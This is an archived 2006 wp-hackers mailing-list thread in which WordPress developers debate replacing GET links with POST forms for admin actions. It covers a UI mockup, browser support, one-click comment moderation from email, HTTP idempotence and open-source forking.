> do a full html mockup with <input>s inplace of all action-performing
> links to prove my point?

Yup, that's what you gotta do.

Andy
From leftjustified at gmail.com  Mon Apr 24 05:25:37 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Mon Apr 24 05:29:45 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
Message-ID: <6453a6e90604232225mf6d5f1dke0ae88940e6246b5@mail.gmail.com>

On 4/24/06, Andy Skelton <skeltoac@gmail.com> wrote:
> On 4/23/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> > Done. Can we move away from that excuse now or am I going to have to
> > do a full html mockup with <input>s inplace of all action-performing
> > links to prove my point?
>
> Yup, that's what you gotta do.

Smartass :)

Fine, I've got the day off tomorrow, consider it done.
I'l tackle /wp-admin/edit.php for the proof of concept.
Is there an official browsers-to-support list? I'm talking how far
back we build for.. IE 5.0 still in? Opera7? I can't find one on
codex...

-Andrew
From false.hopes at gmail.com  Mon Apr 24 05:37:14 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Mon Apr 24 05:41:31 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <6453a6e90604232225mf6d5f1dke0ae88940e6246b5@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604232225mf6d5f1dke0ae88940e6246b5@mail.gmail.com>
Message-ID: <a491f91d0604232237g20fdac47q84cba0a92154c703@mail.gmail.com>

On 4/24/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> On 4/24/06, Andy Skelton <skeltoac@gmail.com> wrote:
> > On 4/23/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> > > Done. Can we move away from that excuse now or am I going to have to
> > > do a full html mockup with <input>s inplace of all action-performing
> > > links to prove my point?
> >
> > Yup, that's what you gotta do.
>
> Smartass :)

Hey, as with everything else, code speaks louder than words.

> Fine, I've got the day off tomorrow, consider it done.
> I'l tackle /wp-admin/edit.php for the proof of concept.
> Is there an official browsers-to-support list? I'm talking how far
> back we build for.. IE 5.0 still in? Opera7? I can't find one on
> codex...

My list for work includes:
IE 5, IE 6, IE 7
Firefox 1.0.x, 1.5.x (and 0.8.x is preferred)
Safari 1.2.x and 2.0.x
Konquerer (whichever version ships with the latest or 2nd-newest KDE release)
Opera 8 and 9 (and 7 is preferred)
And an accessibility test with links or lynx (although, I'm not sure
that'll be neccessary here).

--
--Robert Deaton
http://somethingunpredictable.com
From leftjustified at gmail.com  Mon Apr 24 05:53:29 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Mon Apr 24 05:57:36 2006
Subject: [wp-hackers] Officially supported browsers. was: Security at
	Wordpress
Message-ID: <6453a6e90604232253x6e62ae8as4dfe36dd5a788c78@mail.gmail.com>

On 4/24/06, Robert Deaton <false.hopes@gmail.com> wrote:
> My list for work includes:
> IE 5, IE 6, IE 7
> Firefox 1.0.x, 1.5.x (and 0.8.x is preferred)
> Safari 1.2.x and 2.0.x
> Konquerer (whichever version ships with the latest or 2nd-newest KDE release)
> Opera 8 and 9 (and 7 is preferred)
> And an accessibility test with links or lynx (although, I'm not sure
> that'll be neccessary here).

Thanks for your input Robert, but I'm actually after an official WP
document outlining which browsers the product fully and partially
supports (partial support meaning some CSS niggles allowed).

I noticed your list excludes IEmac; I wonder if WP also excludes this
now dead browser? oh damn, just noticed WP still serves CSS to
Netscape 4?! Maybe I should post a trac item to have <link
media='screen' changed to media='screen,projection' in the default
style so as to block NN4 from choking on the CSS...
..heck, maybe we should change the defazUlt CSS import method to
<style type="text/css" media="screen,projection">
/* \*/
@import 'style.css';
/*  */
</style>

..and block IEmac along with NN4 (does Kubrickdisplay correctly in
IEmac? I'm assuming it does, but what about wp-admin?)

-Andrew
From nuclearmoose at gmail.com  Mon Apr 24 06:05:16 2006
From: nuclearmoose at gmail.com (Craig)
Date: Mon Apr 24 06:09:25 2006
Subject: [wp-hackers] Officially supported browsers. was: Security at
	Wordpress
In-Reply-To: <6453a6e90604232253x6e62ae8as4dfe36dd5a788c78@mail.gmail.com>
References: <6453a6e90604232253x6e62ae8as4dfe36dd5a788c78@mail.gmail.com>
Message-ID: <5aa3aa0604232305p2dca6b58nfbab8a1709bd8510@mail.gmail.com>

I've never seen an official list of supported browsers. I can't even see the
point of having one as there are simply too many factors to consider.

Craig Hartel.
From leftjustified at gmail.com  Mon Apr 24 10:31:55 2006
From: leftjustified at gmail.com (Andrew Krespanis)
Date: Mon Apr 24 10:36:07 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
Message-ID: <6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>

> > Done. Can we move away from that excuse now or am I going to have to
> > do a full html mockup with <input>s inplace of all action-performing
> > links to prove my point?
>
> Yup, that's what you gotta do.

http://leftjustified.net/lab/wordpress/admin/edit.html

Looks fine :)
From mike at zed1.com  Mon Apr 24 11:29:34 2006
From: mike at zed1.com (Mike Little)
Date: Mon Apr 24 11:33:45 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
Message-ID: <7235ce780604240429j4c0d07c2lcc27b002041b8827@mail.gmail.com>

On 4/24/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> > > Done. Can we move away from that excuse now or am I going to have to
> > > do a full html mockup with <input>s inplace of all action-performing
> > > links to prove my point?
> >
> > Yup, that's what you gotta do.
>
> http://leftjustified.net/lab/wordpress/admin/edit.html
>
> Looks fine :)
>

Excellent! well done!

Of course, as it stands, there is no way to identify which button was
pressed, but that's easily fixable. As a visual mock-up to prove the
point, it's great. Well done!


Mike
--
Mike Little
http://zed1.com/
From john at integralsource.com  Mon Apr 24 11:31:23 2006
From: john at integralsource.com (John Keyes)
Date: Mon Apr 24 11:35:34 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
Message-ID: <c0141a030604240431r430d1c3cx70c2dc2fb85841@mail.gmail.com>

Good stuff Andrew, I think that makes it very clear that the UI impact is
minimal.  Thanks for taking the time to do this.

-John K

On 4/24/06, Andrew Krespanis <leftjustified@gmail.com> wrote:
> > > Done. Can we move away from that excuse now or am I going to have to
> > > do a full html mockup with <input>s inplace of all action-performing
> > > links to prove my point?
> >
> > Yup, that's what you gotta do.
>
> http://leftjustified.net/lab/wordpress/admin/edit.html
>
> Looks fine :)
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From wp at ebroder.net  Mon Apr 24 11:44:23 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Apr 24 11:48:26 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <c0141a030604240431r430d1c3cx70c2dc2fb85841@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<c0141a030604240431r430d1c3cx70c2dc2fb85841@mail.gmail.com>
Message-ID: <444CBA17.3010100@ebroder.net>

If you wanted to go for even less change from how it looks now, you
could set the border on the Edit and Delete buttons to 0. It becomes
basically indistinguishable at that point.

- Evan

John Keyes wrote:
> Good stuff Andrew, I think that makes it very clear that the UI impact is
> minimal.  Thanks for taking the time to do this.
>
> -John K
From elharo at metalab.unc.edu  Mon Apr 24 11:52:07 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 11:56:41 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
Message-ID: <444CBBE7.1000408@metalab.unc.edu>

Andrew Krespanis wrote:
>>> Done. Can we move away from that excuse now or am I going to have to
>>> do a full html mockup with <input>s inplace of all action-performing
>>> links to prove my point?
>> Yup, that's what you gotta do.
> 
> http://leftjustified.net/lab/wordpress/admin/edit.html
> 
> Looks fine :)
> 
> 

Thanks! Looks good to me.

If anything this proof of concept goes further than it needs to.  I 
think the edit action is side-effect free and safe since it doesn't 
actually save anything to the database, just open up the edit page. Thus 
the edit action could be done with a GET link instead of a form input.

You might be able to go one step further by using CSS to put a border 
around the View item so it looks like the Edit and Delete buttons. 
Honestly though, this is plenty good enough for me and clearly proves 
your point that appearance need not be a concern when deciding between 
POST and GET.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From skeltoac at gmail.com  Mon Apr 24 11:58:33 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Mon Apr 24 12:02:43 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
Message-ID: <e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>

On 4/24/06, Andrew Krespanis <leftjustified@gmail.com> opined:
> Looks fine :)

Not bad at all.

Still, if you removed the ability to do everything via GET, how am I
going to approve comments from my email with a single click, assuming
I don't allow HTML in my emails? I think that's the actual bar. It may
be unreasonable from a pure security standpoint but the convenience is
more routinely visible than the security.

If you only moved certain actions (e.g. delete post) out of the GET
domain while leaving others alone (e.g. comment moderation) you'd
probably have more luck getting your code committed.

Andy
From ringmaster at midnightcircus.com  Mon Apr 24 12:08:01 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr 24 12:12:32 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
Message-ID: <444CBFA1.7080405@midnightcircus.com>

Andy Skelton wrote:
> If you only moved certain actions (e.g. delete post) out of the GET
> domain while leaving others alone (e.g. comment moderation) you'd
> probably have more luck getting your code committed.

Also note that this is a mock-up, not a patch to the code.  A patch to 
do just what we see here would probably have been less work.

Does this look reasonable in Safari?  That's where I hear there are 
problems, though I haven't looked at it there myself yet.

Strange that all of the POST proponents hadn't written a patch for this 
already - it might have been less overall work than the bluster they've 
created, and it might already have been committed by now.

Owen
From wp at ebroder.net  Mon Apr 24 12:41:18 2006
From: wp at ebroder.net (Evan Broder)
Date: Mon Apr 24 12:45:23 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CBFA1.7080405@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
Message-ID: <444CC76E.8030907@ebroder.net>

Owen Winkler wrote:
> Does this look reasonable in Safari?  That's where I hear there are
> problems, though I haven't looked at it there myself yet.
All buttons are styled as buttons in Safari, regardless of what the CSS
says. You get pretty looking Aqua buttons for Edit and Delete and a link
for View. The solution is probably to make all 3 buttons.

I would also point out that we can always make both GET and POST work by
using $_REQUEST instead of $_GET or $_POST. We'd probably only want to
do this on selective actions, though, otherwise we don't fix anything.

- Evan
From elharo at metalab.unc.edu  Mon Apr 24 12:48:56 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 12:53:31 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CBFA1.7080405@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
Message-ID: <444CC938.7040908@metalab.unc.edu>

Owen Winkler wrote:

> Strange that all of the POST proponents hadn't written a patch for this 
> already - it might have been less overall work than the bluster they've 
> created, and it might already have been committed by now.

Let me repeat myself: experience has taught me that writing patches for 
design flaws is a complete waste of time until the maintainers recognize 
the flaw. While simple fixes for obvious bugs are usually accepted, and 
feature additions are sometimes accepted, architectural changes are 
almost never accepted. This isn't WordPress specific by any means. This 
is a general rule in most open source projects.

At such time as the maintainers decide they want to use POST where 
appropriate, then it makes sense to invest time in creating a patch. 
Until then, the question is not whether to submit a patch. It's whether 
to live with the flaw or fork the project. I personally haven't decided 
yet. Forking is a big step, but not out of the question. I've got a 
growing list of problems with WordPress that can likely only be 
addressed in a separate development branch. I'd certainly prefer not to 
go to all the expense and trouble of maintaining a fork. It's not like I 
don't have enough to unpaid work already; but if the list keeps growing 
then forking may become inevitable.

I've already made a few changes in the code for my personal sites. The 
more changes I make and the further my own codebase diverges from the 
official codebase, the more sense it makes to publish the whole thing, 
and make it official.

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From mike at zed1.com  Mon Apr 24 12:53:02 2006
From: mike at zed1.com (Mike Little)
Date: Mon Apr 24 12:57:15 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CBFA1.7080405@midnightcircus.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
Message-ID: <7235ce780604240553t3ef598abge47c649bfae8362a@mail.gmail.com>

On 4/23/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> You are welcome to produce code that you feel will work better.
>
> WordPress has always been a "put up or shut up" environment.  If you
> feel that you can produce more satisfying code for the WordPress
> userbase, we'll adopt it when when that proves to be true.
>
> I think your mission is folly, but who knows?  Users might actually
> enjoy crappy-looking UI if you are able to explain to them why it's
> better, though you're not doing much convincing here.
>
> All of this academic discussion at the expense of productivity is a
> bore.  I think people understand the issues pretty well now.  Let's move on.
>

And On 4/24/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Also note that this is a mock-up, not a patch to the code.  A patch to
> do just what we see here would probably have been less work.
> [XNP
> Strange that all of the POST proponents hadn't written a patch for this
> already - it might have been less overall work than the bluster they've
> created, and it might already have been committed by now.
>

Owen,
You've really got a bee in your bonnet about this one, haven't you. Is
all this aggression necessary?

If you want to protest about using POST, then do so for the right reasons.

Whilst the HTTP 1.1 standard states

    "...the convention has been established that the GET and HEAD methods
    SHOULD NOT have the significance of taking an action other than retrieval."

It also goes on to say:

    "Methods can also have the property of "idempotence" in that
(aside from error or
    expiration issues) the side-effects of N > 0 identical requests is
the same as for a
    single request."

In other words, of a link *is* used to delete a post, and executing
the same request has no further side effects, then that request (link)
*is* idempotent.

It cannot have any further side effects because the post is already
deleted. If we had a "delete latest post", or "delete all drafts"
links that would be a different matter.


Mike
--
Mike Little
http://zed1.com/
From ryan at ryanduff.net  Mon Apr 24 12:57:39 2006
From: ryan at ryanduff.net (Ryan Duff)
Date: Mon Apr 24 13:02:06 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
Message-ID: <444CCB43.1000509@ryanduff.net>

Andy Skelton wrote:
> On 4/24/06, Andrew Krespanis <leftjustified@gmail.com> opined:
>> Looks fine :)
> 
> Not bad at all.
> 
> Still, if you removed the ability to do everything via GET, how am I
> going to approve comments from my email with a single click, assuming
> I don't allow HTML in my emails? I think that's the actual bar. It may
> be unreasonable from a pure security standpoint but the convenience is
> more routinely visible than the security.
> 
> If you only moved certain actions (e.g. delete post) out of the GET
> domain while leaving others alone (e.g. comment moderation) you'd
> probably have more luck getting your code committed.
> 
> Andy

What about a hash appended to the link that is generated when the email 
is sent? To delete it via a single click it would require the hash to 
match. The other POST method could be used in the admin interface for 
security there.

The only person that would get the hash would be the email recipient, 
removing the risk of anybody being able to craft a link and cause you to 
delete something with a single click.


-- 
Ryan Duff
http://ryanduff.net
AIM: ryancduff
irc.freenode.net #wordpress #plogger
From dstewart at atl.lmco.com  Mon Apr 24 13:00:14 2006
From: dstewart at atl.lmco.com (Doug Stewart)
Date: Mon Apr 24 13:05:06 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CC938.7040908@metalab.unc.edu>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>
	<44495964.6080604@metalab.unc.edu>
	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>
	<444A1713.6060605@metalab.unc.edu>
	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>
	<444A7E37.6000906@metalab.unc.edu>
	<444B7A2D.1060402@midnightcircus.com>
	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>
	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>
	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
	<444CBFA1.7080405@midnightcircus.com>
	<444CC938.7040908@metalab.unc.edu>
Message-ID: <444CCBDE.5050705@atl.lmco.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Elliotte Harold wrote:
> I've already made a few changes in the code for my personal sites. The
> more changes I make and the further my own codebase diverges from the
> official codebase, the more sense it makes to publish the whole thing,
> and make it official.
> 

That's a bit selfish.  What flaws do these patches address?  Have you
submitted tickets to Trac for them?

I don't know what your level of involvement with the WP Trac system has
been thus far, but there is a lot of activity on it.  Tickets routinely
get attention within a day or so of their submission.  If your changes
are indeed beneficial, feature-complete, etc., there's a good chance
that they will be incorporated.

To withhold your actual code and attempt to force action by
"threatening" a fork is pretty arrogant and against the principles of
Open Source development, IMNSHO.

- --
- ----------
Doug Stewart
Systems Administrator/Web Applications Developer
Lockheed Martin Advanced Technology Labs
dstewart@atl.lmco.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.6 (GNU/Linux)
Comment: Using GnuPG with Red Hat - http://enigmail.mozdev.org

iD8DBQFETMveN50Q8DVvcvkRAjt8AJ0Rsi/ynB+S88uu3k9vnFuxDMenIQCfYTdg
zaqElkgAG5hFfkmb2m+Qotg=
=hgjv
-----END PGP SIGNATURE-----
From elharo at metalab.unc.edu  Mon Apr 24 13:16:58 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 13:21:36 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>
	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>
Message-ID: <444CCFCA.8000904@metalab.unc.edu>

Andy Skelton wrote:

> Still, if you removed the ability to do everything via GET, how am I
> going to approve comments from my email with a single click, assuming
> I don't allow HTML in my emails? I think that's the actual bar. It may
> be unreasonable from a pure security standpoint but the convenience is
> more routinely visible than the security.

Comments shouldn't be approved via GET, especially given the active and 
growing attacks by comment spammers. Even without those leeches to worry 
about, some mail clients including GMail will automatically approve all 
such comments. See

http://cafe.elharo.com/web/rest-mistake-1-confirming-gets/

-- 
?Elliotte Rusty Harold  elharo@metalab.unc.edu
XML in a Nutshell 3rd Edition Just Published!
http://www.cafeconleche.org/books/xian3/
http://www.amazon.com/exec/obidos/ISBN=0596007647/cafeaulaitA/ref=nosim
From elharo at metalab.unc.edu  Mon Apr 24 13:48:56 2006
From: elharo at metalab.unc.edu (Elliotte Harold)
Date: Mon Apr 24 13:53:30 2006
Subject: [wp-hackers] Security at Wordpress
In-Reply-To: <444CCBDE.5050705@atl.lmco.com>
References: <D0252C90757CBC4B8BC938A72BEDDF9DF98083@dsimail.drbsystems.com>	<44495964.6080604@metalab.unc.edu>	<a491f91d0604211630o18e3905eq47bfe80b8fec7adb@mail.gmail.com>	<444A1713.6060605@metalab.unc.edu>	<a491f91d0604220742t265836fcsff7515bf498e6d22@mail.gmail.com>	<444A7E37.6000906@metalab.unc.edu>	<444B7A2D.1060402@midnightcircus.com>	<6453a6e90604231856l1c896c4cgaec2140a137eecc8@mail.gmail.com>	<e6ec604d0604232206p6f9ce9adjbb596623e619aa3c@mail.gmail.com>	<6453a6e90604240331j3e644b10k80dd4e0e5d98898f@mail.gmail.com>	<e6ec604d0604240458w6a34775q41bda0f1b291c525@mail.gmail.com>	<444CBFA1.7080405@midnightcircus.com>	<444CC938.7040908@metalab.unc.edu>
	<444CCBDE.5050705@atl.lmco.com>
Message-ID: <444CD748.30306@metalab.unc.edu>

Doug Stewart wrote:

> I don't know what your level of involvement with the WP Trac system has
> been thus far, but there is a lot of activity on it.  Tickets routinely
> get attention within a day or so of their submission.  If your changes
> are indeed beneficial, feature-complete, etc., there's a good chance
> that they will be incorporated.

So far they're small things that I need for my site. I see no chance any 
of these would be adopted into the core code base. Some of them 
shouldn't be.

> To withhold your actual code and attempt to force action by
> "threatening" a fork is pretty arrogant and against the principles of
> Open Source development, IMNSHO.

Forking is a core principle of open source development. One of the 
reasons we write open source (better yet, free) software is precisely so 
that developers who have different needs or who have different visions 
can explore different options.

